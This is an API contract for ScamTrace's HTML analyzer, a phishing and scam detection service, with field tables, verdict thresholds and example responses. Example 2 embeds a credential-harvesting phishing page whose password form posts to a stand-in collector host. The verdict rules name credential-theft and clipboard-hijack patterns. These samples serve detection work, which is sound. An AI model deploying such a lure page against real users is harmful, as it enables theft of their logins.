# C2 analysis API contract (`c2.analysis.v1`)

Component C2 (HTML content & behavior analyzer) of ScamTrace - Part 9 Batch B-1.
For the team frontend (`frontend/scamtrace-dashboard`), the API gateway and ThreatRadar.
Machine-readable contract: [`docs/openapi.json`](openapi.json) (regenerate with
`python scripts/export_openapi.py`). Base URL in development: `http://127.0.0.1:8002`.

## Endpoints

| method | path | purpose |
|---|---|---|
| POST | `/api/v1/analyze` | URL **or** HTML -> verdict, threat class, risk score, findings |
| GET | `/health` | liveness (always fast, no models needed) |
| GET | `/ready` | readiness: 200 when every model is loaded (+ versions), else 503 |

## `POST /api/v1/analyze`

Request (`Content-Type: application/json`, anything else -> 415):

| field | type | notes |
|---|---|---|
| `url` | string, optional | http / https, <= 2,048 chars. Without `html`, **C2 fetches it** (static GET, no JavaScript, no sub-resources, private / internal addresses refused, 5 redirects, 5 MB, 10 s) |
| `html` | string, optional | raw HTML (paste / test mode), <= 5 MB (413). Skips the fetch; `url` is then only used to resolve links, never fetched |
| `request_id` | string, optional | your id (letters, digits, `._:-`, <= 128), echoed back |
| `source` | `"user"` \| `"threatradar"` \| `"api"` | default `"api"` |

At least one of `url` / `html` is required (422 otherwise).

### Response fields

| field | meaning |
|---|---|
| `status` | `ok` (verdict given) · `inconclusive` (page is a parking page / bot challenge / empty / not HTML - evidence returned, **no verdict** unless rule evidence fired) · `unreachable` (DNS, timeout, refused, TLS, HTTP 4xx/5xx, or a private address refused - **no verdict**) · `error` (analysis failed) |
| `verdict` | `Legitimate` · `Suspicious` · `Malicious` · `null` when there is no verdict |
| `threat_class` | `benign` (for Legitimate) or the most probable threat: `phishing`, `fake_ecommerce`, `crypto_scam`, `malware_delivery` |
| `risk_score` | 0-100 = round(100 × (1 − P(benign))); `null` without a verdict |
| `class_probabilities` | fused probability per class |
| `findings[]` | `id`, `modality` (dom · content · behavior · fetch · fusion), `severity` (critical · high · medium · low · info), `title`, `detail` (plain English), `evidence` (short PII-masked snippet or a domain - **never raw HTML**), `raises_verdict` (an evidence-floor rule). Sorted by importance, at most 10; `findings_total` / `findings_omitted` count the rest |
| `modalities.{dom,content,behavior}` | `status` ok · failed · skipped, `reason`, `summary`, `top_evidence`, `arms[]` (each model: status, predicted, probabilities, `fusion_weight` used) |
| `explanation` | `verdict_source` (`fusion` / `evidence_floor` / `none`), `arm_contributions` (weight × probability towards `explained_class`), `driving_arm`, `top_features`, `evidence_floor_rules` (rules that fired), `arms_used`, `thresholds` applied |
| `degraded` | `true` if a model arm failed for this page - the verdict uses the other arms, with thresholds calibrated for them |
| `warnings[]` | e.g. "Sinhala page: the text models have limited Sinhala training data ..." |
| `input` | `mode`, `submitted_url`, `final_url`, `redirect_hosts`, `http_status`, `content_type` (URLs PII-masked) |
| `cached` | `true` when answered from the cache (same normalized URL within 10 min) |
| `analysis_id`, `analyzed_at`, `schema_version`, `model_versions`, `timings_ms` | bookkeeping |

**How to show a verdict:** Malicious = block / red; Suspicious = "check before you trust" / amber;
Legitimate = green; no verdict = grey with `status_reason`. Render every string with
`textContent` (never `innerHTML`): findings describe hostile pages.

### Verdict rule

`Malicious` if P(benign) < t_m (≤ 2 % of benign pages reach it, out-of-fold), `Suspicious` if
P(benign) < t_s (≥ 95 % of threat pages fall below it, out-of-fold), else `Legitimate`. Thresholds
are calibrated per subset of model arms (`configs/verdict.yaml`). **Evidence floor:** when
reliable rule evidence fires (password form posting to another domain / a form-collection
service, page code sending typed credentials or keystrokes to another site, clipboard swapped
for a crypto wallet, ClickFix lure, automatic risky download, URL serving an executable) the
verdict is at least `Suspicious` and `risk_score` at least the Suspicious floor; then
`explanation.verdict_source = "evidence_floor"`, the rule ids are in
`explanation.evidence_floor_rules` and a `fusion.evidence_floor` finding is added.

### Errors

| code | when | body |
|---|---|---|
| 413 | `html` (or the whole body) larger than 5 MB | `{"detail": ...}` |
| 415 | body is not `application/json` | `{"detail": ...}` |
| 422 | no `url` / `html`, url not http(s), > 2,048 chars, unknown field | FastAPI validation error |
| 429 | more than 30 analyses per minute from one client | `Retry-After` header (seconds) |
| 503 | models could not be loaded (see `/ready`) | `{"detail": ...}` |
| 504 | the 30 s time budget was exceeded | the **partial** AnalysisResponse (`status: "error"`) |

CORS: only origins in `CORS_ORIGINS` (.env), methods GET / POST, header `Content-Type`.

## Example 1 - benign page (html mode)

Request:

```json
{
  "html": "<html>... (page HTML) ...</html>",
  "url": "https://azure.microsoft.com/en-us",
  "source": "user",
  "request_id": "ui-1001"
}
```

Response (shortened: first findings, arm details trimmed):

```json
{
  "analysis_id": "3b498c1baeaa4d3abd842a8ab99fcacd",
  "request_id": "ui-1001",
  "schema_version": "c2.analysis.v1",
  "analyzed_at": "2026-10-17T21:31:27.818087+05:30",
  "source": "user",
  "cached": false,
  "input": {
    "mode": "html",
    "submitted_url": "https://azure.microsoft.com/en-us",
    "final_url": null,
    "redirect_hosts": [],
    "http_status": null,
    "content_type": null,
    "html_bytes": 465779
  },
  "status": "ok",
  "status_reason": null,
  "verdict": "Legitimate",
  "threat_class": "benign",
  "risk_score": 28,
  "class_probabilities": {
    "benign": 0.717699,
    "phishing": 0.054459,
    "fake_ecommerce": 0.05138,
    "crypto_scam": 0.135324,
    "malware_delivery": 0.041139
  },
  "page_language": "en",
  "findings": [
    {
      "id": "dom.form_action_empty_or_js",
      "modality": "dom",
      "severity": "medium",
      "title": "1 form(s) with an empty, '#' or javascript: action",
      "detail": "Forms whose action is empty, \"#\" or javascript: - the data is handled by JavaScript (often sent elsewhere) instead of a visible target.",
      "evidence": null,
      "raises_verdict": false
    },
    {
      "id": "dom.hidden_text_ratio",
      "modality": "dom",
      "severity": "medium",
      "title": "43% of the page text is hidden",
      "detail": "Hidden text divided by all text (hidden + visible).",
      "evidence": null,
      "raises_verdict": false
    },
    {
      "id": "dom.javascript_url_count",
      "modality": "dom",
      "severity": "medium",
      "title": "1 javascript: URL(s)",
      "detail": "Links/actions using javascript: URLs - clicks that run code instead of navigating.",
      "evidence": null,
      "raises_verdict": false
    },
    {
      "id": "fusion.verdict",
      "modality": "fusion",
      "severity": "info",
      "title": "Fused models: Legitimate (benign 72%)",
      "detail": "4 model arm(s) combined; P(benign) = 0.72 (Malicious below 0.18, Suspicious below 0.51).",
      "evidence": null,
      "raises_verdict": false
    }
  ],
  "findings_total": 4,
  "findings_omitted": 0,
  "modalities": {
    "dom": {
      "status": "ok",
      "reason": null,
      "summary": "3 structural finding(s) (0 high); DOM model: benign 93%",
      "top_evidence": [
        "1 form(s) with an empty, '#' or javascript: action",
        "1 javascript: URL(s)",
        "43% of the page text is hidden"
      ],
      "arms": [
        {
          "arm": "dom",
          "status": "ok",
          "predicted": "benign",
          "fusion_weight": 0.1,
          "reason": null
        }
      ]
    },
    "content": {
      "status": "ok",
      "reason": null,
      "summary": "language en (81%); 2998 chars of model text; Text TF-IDF: benign 83%; Text XLM-R: benign 62%; Text XLM-R input truncated (764 tokens)",
      "top_evidence": [],
      "arms": [
        {
          "arm": "text_tfidf",
          "status": "ok",
          "predicted": "benign",
          "fusion_weight": 0.2,
          "reason": null
        },
        {
          "arm": "text_xlmr",
          "status": "ok",
          "predicted": "benign",
          "fusion_weight": 0.4,
          "reason": null
        }
      ]
    },
    "behavior": {
      "status": "ok",
      "reason": null,
      "summary": "12 script(s), 0 source->sink flow(s), 0 finding(s); behavior risk 0; behavior model: benign 70%",
      "top_evidence": [],
      "arms": [
        {
          "arm": "behavior",
          "status": "ok",
          "predicted": "benign",
          "fusion_weight": 0.3,
          "reason": null
        }
      ]
    }
  },
  "explanation": {
    "verdict_source": "fusion",
    "explained_class": "benign",
    "method": "renormalized late-fusion weight x arm probability",
    "arm_contributions": {
      "dom": 0.0933,
      "behavior": 0.209,
      "text_tfidf": 0.1659,
      "text_xlmr": 0.2495
    },
    "driving_arm": "text_xlmr",
    "top_features": [
      {
        "arm": "dom",
        "feature": "internal_link_count",
        "value": 265.0,
        "contribution": 0.24047763728283494,
        "text": "Web links to the page's own registrable domai... [internal_link_count] = 265 pushes towards benign"
      },
      {
        "arm": "behavior",
        "feature": "external_script_count",
        "value": 72.0,
        "contribution": 0.07893587135750912,
        "text": "Number of references [external_script_count] = 72 pushes towards benign"
      }
    ],
    "evidence_floor_rules": [],
    "arms_used": [
      "dom",
      "behavior",
      "text_tfidf",
      "text_xlmr"
    ],
    "thresholds": {
      "arms": "dom+behavior+text_tfidf+text_xlmr",
      "malicious_below_p_benign": 0.182466,
      "suspicious_below_p_benign": 0.511482,
      "malicious_min_risk": 82,
      "suspicious_min_risk": 49
    }
  },
  "degraded": false,
  "warnings": [],
  "model_versions": {
    "analyzer": "0.1.0",
    "schema": "c2.analysis.v1",
    "dataset": "v0.3",
    "dom": "random_forest@2026-10-14T23:47:12+05:30",
    "behavior": "random_forest@2026-10-15T06:55:21+05:30",
    "text_tfidf": "tfidf_logreg@2026-10-16T20:04:02+05:30",
    "text_xlmr": "xlm-roberta-base fine-tuned (seed 43)",
    "fusion": "weighted@2026-10-16T23:19:15+05:30",
    "verdict_thresholds": "2026-10-17T21:04:36+05:30"
  },
  "timings_ms": {
    "preprocess": 283.3,
    "quality": 67.2,
    "dom_features": 58.1,
    "dom_model": 200.8,
    "content": 127.3,
    "text_models": 398.4,
    "js_analysis": 9.1,
    "behavior": 10.8,
    "behavior_model": 34.7,
    "fusion": 0.1,
    "total": 1191.5
  }
}
```

## Example 2 - phishing page, evidence floor fired (html mode)

Request:

```json
{
  "html": "<html><head><title>Verify your account</title></head><body><h1>Account suspended</h1><p>Sign in within 24 hours or your account is closed.</p><form action=\"https://collector.example/login.php\" method=\"post\"><input type=\"email\" name=\"email\"><input type=\"password\" name=\"pass\"><button>Sign in</button></form></body></html>",
  "url": "https://account-verify.example/login",
  "source": "api",
  "request_id": "demo-2"
}
```

Response (shortened). The models already say Malicious here; the evidence-floor rule
`dom.password_form_external_action` fired too (`raises_verdict: true`, listed in
`explanation.evidence_floor_rules`). When the models alone would have said Legitimate, the
same page comes back as `"verdict": "Suspicious"`, `"risk_score": 49` (the Suspicious floor),
`"explanation": {"verdict_source": "evidence_floor", ...}` plus a `fusion.evidence_floor`
finding "Verdict raised to Suspicious by rule evidence".

```json
{
  "analysis_id": "9c95ed040afd42e4b3e62699fdefeced",
  "request_id": "demo-2",
  "schema_version": "c2.analysis.v1",
  "analyzed_at": "2026-10-17T21:31:27.941220+05:30",
  "source": "api",
  "cached": false,
  "input": {
    "mode": "html",
    "submitted_url": "https://account-verify.example/login",
    "final_url": null,
    "redirect_hosts": [],
    "http_status": null,
    "content_type": null,
    "html_bytes": 320
  },
  "status": "ok",
  "status_reason": null,
  "verdict": "Malicious",
  "threat_class": "phishing",
  "risk_score": 94,
  "class_probabilities": {
    "benign": 0.056535,
    "phishing": 0.663786,
    "fake_ecommerce": 0.033031,
    "crypto_scam": 0.06795,
    "malware_delivery": 0.178698
  },
  "page_language": "en",
  "findings": [
    {
      "id": "dom.password_form_external_action",
      "modality": "dom",
      "severity": "high",
      "title": "Password form submits to external domain collector.example",
      "detail": "A form containing a password field submits to an external domain - one of the strongest structural phishing signals.",
      "evidence": "collector.example",
      "raises_verdict": true
    },
    {
      "id": "dom.has_external_form_action",
      "modality": "dom",
      "severity": "high",
      "title": "Form submits to an external domain (collector.example)",
      "detail": "At least one form submits its data to another site.",
      "evidence": "collector.example",
      "raises_verdict": false
    },
    {
      "id": "fusion.verdict",
      "modality": "fusion",
      "severity": "high",
      "title": "Fused models: Malicious (phishing 66%)",
      "detail": "4 model arm(s) combined; P(benign) = 0.06 (Malicious below 0.18, Suspicious below 0.51).",
      "evidence": null,
      "raises_verdict": false
    },
    {
      "id": "dom.sensitive_field_count",
      "modality": "dom",
      "severity": "medium",
      "title": "1 field(s) ask for secrets (password, OTP/PIN, card)",
      "detail": "Fields for secrets that a scammer can use directly - password + OTP/PIN + card fields.",
      "evidence": null,
      "raises_verdict": false
    }
  ],
  "findings_total": 6,
  "findings_omitted": 0,
  "modalities": {
    "dom": {
      "status": "ok",
      "reason": null,
      "summary": "3 structural finding(s) (2 high); DOM model: phishing 74%",
      "top_evidence": [
        "Form submits to an external domain (collector.example)",
        "Password form submits to external domain collector.example",
        "1 field(s) ask for secrets (password, OTP/PIN, card)"
      ],
      "arms": [
        {
          "arm": "dom",
          "status": "ok",
          "predicted": "phishing",
          "fusion_weight": 0.1,
          "reason": null
        }
      ]
    },
    "content": {
      "status": "ok",
      "reason": null,
      "summary": "language en (99%); 128 chars of model text; Text TF-IDF: phishing 64%; Text XLM-R: phishing 92%",
      "top_evidence": [
        "Account suspended",
        "Verify your account"
      ],
      "arms": [
        {
          "arm": "text_tfidf",
          "status": "ok",
          "predicted": "phishing",
          "fusion_weight": 0.2,
          "reason": null
        },
        {
          "arm": "text_xlmr",
          "status": "ok",
          "predicted": "phishing",
          "fusion_weight": 0.4,
          "reason": null
        }
      ]
    },
    "behavior": {
      "status": "ok",
      "reason": null,
      "summary": "0 script(s), 0 source->sink flow(s), 0 finding(s); behavior risk 0; behavior model: malware_delivery 44%",
      "top_evidence": [],
      "arms": [
        {
          "arm": "behavior",
          "status": "ok",
          "predicted": "malware_delivery",
          "fusion_weight": 0.3,
          "reason": null
        }
      ]
    }
  },
  "explanation": {
    "verdict_source": "fusion",
    "explained_class": "phishing",
    "method": "renormalized late-fusion weight x arm probability",
    "arm_contributions": {
      "dom": 0.0736,
      "behavior": 0.0957,
      "text_tfidf": 0.1283,
      "text_xlmr": 0.3662
    },
    "driving_arm": "text_xlmr",
    "top_features": [
      {
        "arm": "behavior",
        "feature": "external_script_count",
        "value": 0.0,
        "contribution": 0.13674221291169986,
        "text": "Number of references [external_script_count] = 0 pushes towards malware_delivery"
      },
      {
        "arm": "dom",
        "feature": "internal_link_count",
        "value": 0.0,
        "contribution": 0.1358434521360892,
        "text": "Web links to the page's own registrable domai... [internal_link_count] = 0 pushes towards phishing"
      }
    ],
    "evidence_floor_rules": [
      "dom.password_form_external_action"
    ],
    "arms_used": [
      "dom",
      "behavior",
      "text_tfidf",
      "text_xlmr"
    ],
    "thresholds": {
      "arms": "dom+behavior+text_tfidf+text_xlmr",
      "malicious_below_p_benign": 0.182466,
      "suspicious_below_p_benign": 0.511482,
      "malicious_min_risk": 82,
      "suspicious_min_risk": 49
    }
  },
  "degraded": false,
  "warnings": [
    "The page text matches Part 1's 'suspended_hosting' placeholder wording, but it asks for a password, so it is analyzed as a real page."
  ],
  "model_versions": {
    "analyzer": "0.1.0",
    "schema": "c2.analysis.v1",
    "dataset": "v0.3",
    "dom": "random_forest@2026-10-14T23:47:12+05:30",
    "behavior": "random_forest@2026-10-15T06:55:21+05:30",
    "text_tfidf": "tfidf_logreg@2026-10-16T20:04:02+05:30",
    "text_xlmr": "xlm-roberta-base fine-tuned (seed 43)",
    "fusion": "weighted@2026-10-16T23:19:15+05:30",
    "verdict_thresholds": "2026-10-17T21:04:36+05:30"
  },
  "timings_ms": {
    "preprocess": 1.3,
    "quality": 0.5,
    "dom_features": 0.5,
    "dom_model": 30.8,
    "content": 0.9,
    "text_models": 43.3,
    "js_analysis": 0.1,
    "behavior": 0.3,
    "behavior_model": 34.9,
    "fusion": 0.1,
    "total": 113.5
  }
}
```

## Example 3 - unreachable URL (url mode, e.g. ThreatRadar)

Request:

```json
{
  "url": "https://this-scam-was-taken-down.invalid/login",
  "source": "threatradar",
  "request_id": "tr-77"
}
```

Response - no verdict for a page C2 could not see (not cached, a later retry fetches again):

```json
{
  "analysis_id": "433c33a5ae79409bb4799e8f21dce394",
  "request_id": "tr-77",
  "schema_version": "c2.analysis.v1",
  "analyzed_at": "2026-10-17T21:31:28.274297+05:30",
  "source": "threatradar",
  "cached": false,
  "input": {
    "mode": "url",
    "submitted_url": "https://this-scam-was-taken-down.invalid/login",
    "final_url": null,
    "redirect_hosts": [],
    "http_status": null,
    "content_type": null,
    "html_bytes": null
  },
  "status": "unreachable",
  "status_reason": "ConnectError: [Errno 11001] getaddrinfo failed",
  "verdict": null,
  "threat_class": null,
  "risk_score": null,
  "class_probabilities": {},
  "page_language": null,
  "findings": [
    {
      "id": "fetch.unreachable",
      "modality": "fetch",
      "severity": "info",
      "title": "The page could not be fetched",
      "detail": "ConnectError: [Errno 11001] getaddrinfo failed. Scam pages are often taken down quickly; no verdict is given for a page C2 could not see.",
      "evidence": "this-scam-was-taken-down.invalid",
      "raises_verdict": false
    }
  ],
  "findings_total": 1,
  "findings_omitted": 0,
  "modalities": {
    "dom": {
      "status": "skipped",
      "reason": "the page could not be fetched",
      "summary": null,
      "top_evidence": [],
      "arms": []
    },
    "content": {
      "status": "skipped",
      "reason": "the page could not be fetched",
      "summary": null,
      "top_evidence": [],
      "arms": []
    },
    "behavior": {
      "status": "skipped",
      "reason": "the page could not be fetched",
      "summary": null,
      "top_evidence": [],
      "arms": []
    }
  },
  "explanation": {
    "verdict_source": "none",
    "explained_class": null,
    "method": null,
    "arm_contributions": {},
    "driving_arm": null,
    "top_features": [],
    "evidence_floor_rules": [],
    "arms_used": [],
    "thresholds": {}
  },
  "degraded": false,
  "warnings": [],
  "model_versions": {
    "analyzer": "0.1.0",
    "schema": "c2.analysis.v1",
    "dataset": "v0.3",
    "dom": "random_forest@2026-10-14T23:47:12+05:30",
    "behavior": "random_forest@2026-10-15T06:55:21+05:30",
    "text_tfidf": "tfidf_logreg@2026-10-16T20:04:02+05:30",
    "text_xlmr": "xlm-roberta-base fine-tuned (seed 43)",
    "fusion": "weighted@2026-10-16T23:19:15+05:30",
    "verdict_thresholds": "2026-10-17T21:04:36+05:30"
  },
  "timings_ms": {
    "fetch": 322.5,
    "total": 322.6
  }
}
```

## `GET /ready`

```json
{
  "ready": true,
  "loading": false,
  "reason": null,
  "xlmr_enabled": true,
  "arms": {
    "dom": {
      "loaded": true,
      "reason": null
    },
    "behavior": {
      "loaded": true,
      "reason": null
    },
    "text_tfidf": {
      "loaded": true,
      "reason": null
    },
    "text_xlmr": {
      "loaded": true,
      "reason": null
    }
  },
  "model_versions": {
    "analyzer": "0.1.0",
    "schema": "c2.analysis.v1",
    "dataset": "v0.3",
    "dom": "random_forest@2026-10-14T23:47:12+05:30",
    "behavior": "random_forest@2026-10-15T06:55:21+05:30",
    "text_tfidf": "tfidf_logreg@2026-10-16T20:04:02+05:30",
    "text_xlmr": "xlm-roberta-base fine-tuned (seed 43)",
    "fusion": "weighted@2026-10-16T23:19:15+05:30",
    "verdict_thresholds": "2026-10-17T21:04:36+05:30"
  },
  "load_ms": 7953.6
}
```

## Notes for integrators

- ThreatRadar: send `{"url": ..., "source": "threatradar", "request_id": <feed id>}`; treat
  `unreachable` as "retry later", `inconclusive` as "needs a human / rendered check".
- The legacy gateway route `POST /analyze-html` is still a 501 stub; the gateway should call
  `POST /api/v1/analyze` with `{"url": ...}` (Part 9 Batch B-2).
- One worker process: the cache and rate limit are in memory (a shared store would be needed
  with several workers).
